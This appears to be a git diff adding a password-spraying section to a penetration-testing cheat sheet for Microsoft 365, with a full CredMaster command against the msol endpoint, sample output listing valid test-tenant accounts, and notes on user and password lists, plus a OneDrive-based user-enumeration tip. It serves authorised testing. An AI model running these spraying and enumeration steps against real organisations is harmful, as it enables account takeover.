@@ -144,3 +144,30 @@ foreach($user in $users)
 It is possible to check if a user exists by sending a HTTP HEAD request to a onedrive url. The format of the url is always:   
  `https://company-my.sharepoint.com/personal/username_domain_tld`   
 Note: Dots (.) and at (@) have to be replaced with underscore (_).
+
+# PW Spraying
+## CredMaster
+https://github.com/knavesec/CredMaster/   
+Using the credmaster tool, the module msol can be for example used to identify valid passwords:    
+```python 
+$ python3 credmaster.py --access_key <AWS_ACCESSKEY> --secret_access_key <AWS_SECRETKEY> --plugin msol -u /home/kali/Desktop/users.txt -p /home/kali/Desktop/passlist.txt -a /home/kali/Desktop/useragent.txt -o /home/kali/Desktop/credmasterout4 -t 5 -j 20 -m 10 -d 30 --passwordsperdelay 3
+[ ... ]
+[2023-10-05 09:33:41.481] Loading credentials from /home/kali/Desktop/testusers.txt with password xxxxxxx!
+[2023-10-05 09:33:54.211] eu-west-3: [+] SUCCESS: camilo.rojo@testdomain.onmicrosoft.com:xxxxxxx! - NOTE: The response indicates MFA (Microsoft) is in use
+[2023-10-05 09:33:55.463] us-east-2: [-] FAILURE: Invalid username or password. Username: cedomir.sekulic@testdomain.onmicrosoft.com could exist
+[2023-10-05 09:33:55.544] us-west-2: [+] SUCCESS: jarl.gietema@testdomain.onmicrosoft.com:xxxxxxx!
+[2023-10-05 09:33:57.328] us-west-1: [-] FAILURE: Invalid username or password. Username: marc.hall@testdomain.onmicrosoft.com could exist
+[2023-10-05 09:33:58.035] us-east-1: [-] FAILURE: Invalid username or password. Username: wallace.sims@testdomain.onmicrosoft.com could exist
+[2023-10-05 09:34:08.933] eu-west-3: [-] FAILURE: Invalid username or password. Username: alyssa.laurent@testdomain.onmicrosoft.com could exist
+[2023-10-05 09:34:09.825] us-west-1: [-] FAILURE: Invalid username or password. Username: nathan.patel@testdomain.onmicrosoft.com could exist
+[ ... ]
+[2023-10-05 09:34:58.271] End Time: 2023-10-05 09:34:58.271320
+[2023-10-05 09:34:58.272] Total Execution: 89.247289 seconds
+[2023-10-05 09:34:58.272] Valid credentials identified: 2
+[2023-10-05 09:34:58.272] VALID - camilo.rojo@testdomain.onmicrosoft.com:xxxxxxx!
+[2023-10-05 09:34:58.272] VALID - jarl.gietema@testdomain.onmicrosoft.com:xxxxxxx!
+Files used in parameters:
+
+- users.txt → list of emails, one per line (e.g. matti.meikalainen@domain.fi)
+- passlist.txt → list of passwords to test
+- useragent.txt → list of useragents, e.g. taken from: https://github.com/knavesec/CredMaster/blob/master/useragents.txt
